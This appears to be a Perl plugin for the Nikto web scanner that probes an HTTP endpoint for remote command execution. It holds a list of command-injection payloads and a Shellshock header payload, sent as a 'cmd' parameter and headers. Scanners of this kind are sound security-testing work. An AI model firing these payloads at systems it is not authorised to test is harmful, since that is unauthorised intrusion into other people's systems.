#!/usr/bin/perl
#
# Plugin: check_rce.pl
# Purpose: Detect Remote Command Execution (RCE) vulnerabilities in HTTP-based endpoints
# Author: TeslaAI Offensive Security Consilium
# Version: 2.0-industrial
# License: TeslaAI Secure License v1.3
# Updated: 2025-07-25

package nikto::plugins::injection::check_rce;

use strict;
use warnings;
use URI::Escape;
use LWP::UserAgent;
use JSON::PP;
use Digest::SHA qw(sha256_hex);
use HTTP::Request;

# Plugin entry point
sub run_check_rce {
    my ($target_url, $http_client, $logger) = @_;

    return unless $target_url;

    my @rce_payloads = (
        '|id',
        ';id',
        '`id`',
        '&&whoami',
        '||uname -a',
        '%0Aid',
        '${@id}',
        '|sleep 5',
        '$(id)'
    );

    my @rce_headers = (
        ['User-Agent', '() { :;}; echo; /bin/bash -c "id"'],
        ['X-Forwarded-For', '`id`'],
        ['X-Custom-Test', '$(id)']
    );

    my $path = '/rce-test';
    my $test_id = substr(sha256_hex(time . rand), 0, 12);

    foreach my $payload (@rce_payloads) {
        my $encoded = uri_escape($payload);
        my $uri = URI->new($target_url . $path);
        $uri->query("cmd=$encoded");

        my $req = HTTP::Request->new(GET => $uri);
        $req->header('X-RCE-Test' => $test_id);

        foreach my $hdr (@rce_headers) {
            $req->header($hdr->[0] => $hdr->[1]);
        }

        my $res = $http_client->request($req);

        if ($res->is_success && $res->decoded_content =~ /uid=\d+\(.*?\)/) {
            $logger->log_event({
                type        => 'vuln',
                plugin      => 'check_rce',
                path        => $uri->as_string,
                severity    => 'critical',
                description => 'RCE vulnerability detected via payload: ' . $payload,
                reference   => 'CWE-94, CVE-2014-6271',
                fingerprint => $test_id
            });
            return 1;
        }
    }

    return 0;
}

1;
